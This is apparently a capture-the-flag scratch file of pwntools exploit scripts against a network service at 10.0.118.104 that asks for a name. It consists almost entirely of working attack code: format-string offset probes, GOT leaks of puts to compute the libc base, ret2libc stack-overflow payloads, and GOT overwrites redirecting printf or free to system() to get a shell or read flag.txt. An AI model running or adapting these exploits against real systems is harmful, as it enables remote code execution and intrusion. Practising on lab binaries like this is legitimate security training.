# from pwn import *

# for i in range(1,40):

#     p = remote("10.0.118.104",3377)

#     payload = f"%{i}$p".encode()

#     p.recvuntil(b"name?")
#     p.sendline(payload)

#     out = p.recvall(timeout=1)

#     print(i, out)

#     p.close()
    
# from pwn import *

# for i in range(1,40):

#     p = remote("10.0.118.104",3377)

#     payload = f"AAAA.%{i}$p".encode()

#     p.recvuntil(b"name?")
#     p.sendline(payload)

#     out = p.recvall(timeout=1)

#     print(i, out)

#     p.close()

# from pwn import *

# libc_base = 0xf7de0000

# system  = libc_base + 0x3a950
# exit    = libc_base + 0x2e7c0
# binsh   = libc_base + 0x15912b

# offset = 132

# payload  = b"A"*offset
# # payload += b"\x00"
# payload += p32(system)
# payload += p32(exit)
# payload += p32(binsh)

# p = remote("10.0.118.104",3377)

# p.recvuntil(b"name?")
# p.sendline(payload)

# p.interactive()

# from pwn import *

# print(cyclic(300))

# from pwn import *
# print(cyclic_find(0x62616169))

# from pwn import *

# for i in range(1,20):
#     p = remote("10.0.118.104",3377)

#     payload = b"AAAA%" + str(i).encode() + b"$sBBBB" + p32(0x804a024)

#     p.recvuntil(b"name?")
#     p.sendline(payload)

#     out = p.recvall(timeout=1)

#     print(i, out)

#     p.close()

from pwn import *

printf_got = 0x804a010

system = 0xf718a950

low  = system & 0xffff
high = (system >> 16) & 0xffff

payload  = p32(printf_got)
payload += p32(printf_got+2)

payload += f"%{low-8}x%4$hn".encode()
payload += f"%{high-low}x%5$hn".encode()

p = remote("10.0.118.104",3377)

p.recvuntil(b"name?")
p.sendline(payload)

p.close()

# second run executes system()

p = remote("10.0.118.104",3377)
p.recvuntil(b"name?")
p.sendline(b"cat flag.txt")

p.interactive()

# from pwn import *

# elf = ELF("./bin/hello")
# libc = ELF("./bin/libc-2.23.so")

# puts_got = 0x804a024
# offset = 132

# p = remote("10.0.118.104",3377)

# # leak puts
# payload = b"AAAA%7$sBBBB" + p32(puts_got)

# p.recvuntil(b"name?")
# p.sendline(payload)

# p.recvuntil(b"AAAA")
# leak = p.recvuntil(b"BBBB")[:-4]

# puts_addr = u32(leak.ljust(4,b"\x00"))
# log.info("puts: " + hex(puts_addr))

# libc_base = puts_addr - libc.symbols['puts']
# system = libc_base + libc.symbols['system']
# exit = libc_base + libc.symbols['exit']

# p.close()

# p = remote("10.0.118.104",3377)

# cmd = b"cat flag.txt\x00"

# payload  = cmd
# payload += b"A"*(offset-len(cmd))
# payload += p32(system)
# payload += p32(exit)
# payload += p32(0xffffd000)  # stack pointer to cmd

# p.recvuntil(b"name?")
# p.sendline(payload)

# p.interactive()

# from pwn import *

# libc_base = 0xf7f6f000
# # libc_base = 0xf7e2e50d

# # offsets from libc-2.23.so
# system_offset = 0x3a950
# exit_offset   = 0x2e7c0
# binsh_offset  = 0x15912b

# offset = 132

# system = libc_base + system_offset
# exit   = libc_base + exit_offset
# binsh  = libc_base + binsh_offset

# payload = b"A"*offset
# payload += p32(system)
# payload += p32(exit)
# payload += p32(binsh)

# print("system:", hex(system))
# print("exit:", hex(exit))
# print("binsh:", hex(binsh))
# print("\nPayload to paste into nc:\n")

# print(payload)

# from pwn import *

# def exec_fmt(payload):
#     p = remote("10.0.118.104",3377)
#     p.recvuntil(b"name?")
#     p.sendline(payload)
#     return p.recvall()

# autofmt = FmtStr(exec_fmt)
# print(autofmt.offset)

# from pwn import *

# elf = ELF("./bin/hello")
# libc = ELF("./bin/libc-2.23.so")

# # ---------- stage 1 : overwrite free GOT ----------
# p = remote("10.0.118.104",3377)

# p.recvuntil(b"name?")

# p.sendline(b"%12$p")
# p.recvuntil(b"Hello, ")

# leak = int(p.recvline().strip().rstrip(b"!"),16)

# libc_base = leak - (0x19970 + 241)
# system = libc_base + libc.symbols['system']

# log.info("libc base: " + hex(libc_base))
# log.info("system: " + hex(system))

# free_got = elf.got['free']

# payload = fmtstr_payload(1, {free_got: system})

# p.sendline(payload)
# p.close()

# # ---------- stage 2 : trigger system ----------
# p = remote("10.0.118.104",3377)

# p.recvuntil(b"name?")
# p.sendline(b"/bin/sh")

# p.interactive()

# from pwn import *

# elf = ELF("./bin/hello")
# libc = ELF("./bin/libc-2.23.so")

# p = remote("10.0.118.104",3377)

# offset = 132
# puts_got = elf.got['puts']

# p.recvuntil(b"name?")

# payload = b"%7$sAAAA" + p32(puts_got)
# p.sendline(payload)

# p.recvuntil(b"Hello, ")
# leak = p.recvuntil(b"AAAA")[:-4]

# puts_addr = u32(leak.ljust(4,b"\x00"))

# log.info("puts leak: " + hex(puts_addr))

# libc_base = puts_addr - libc.symbols['puts']

# system = libc_base + libc.symbols['system']
# exit   = libc_base + libc.symbols['exit']
# binsh  = libc_base + next(libc.search(b"/bin/sh"))

# log.info("libc base: " + hex(libc_base))
# log.info("system: " + hex(system))
# log.info("binsh: " + hex(binsh))

# payload = b"A"*offset
# payload += p32(system)
# payload += p32(exit)
# payload += p32(binsh)

# p.sendline(payload)

# p.interactive()

# from pwn import *

# elf = ELF("./bin/hello")

# for i in range(1,20):
#     p = remote("10.0.118.104",3377)
#     p.recvuntil(b"name?")
    
#     payload = f"%{i}$sAAAA".encode() + p32(elf.got['puts'])
#     p.sendline(payload)

#     data = p.recvall(timeout=1)
#     print(i, data)

#     p.close()


# from pwn import *

# elf = ELF("./bin/hello")
# libc = ELF("./bin/libc-2.23.so")

# p = remote("10.0.118.104",3377)

# offset = 132

# p.recvuntil(b"name?")

# # leak puts
# payload = b"%3$sAAAA" + p32(elf.got['puts'])
# p.sendline(payload)

# p.recvuntil(b"Hello, ")
# leak = p.recvuntil(b"AAAA")[:-4]

# puts_addr = u32(leak[:4])
# log.info("puts leak: " + hex(puts_addr))

# libc_base = puts_addr - libc.symbols['puts']

# system = libc_base + libc.symbols['system']
# exit = libc_base + libc.symbols['exit']
# binsh = libc_base + next(libc.search(b"/bin/sh"))

# log.info("libc base: " + hex(libc_base))
# log.info("system: " + hex(system))
# log.info("binsh: " + hex(binsh))

# # stack smash
# payload = b"A"*offset
# payload += b"\x00"
# payload += p32(system)
# payload += p32(exit)
# payload += p32(binsh)

# print(payload)
# print(payload.decode(errors="ignore"))
# p.sendline(payload)
# p.interactive()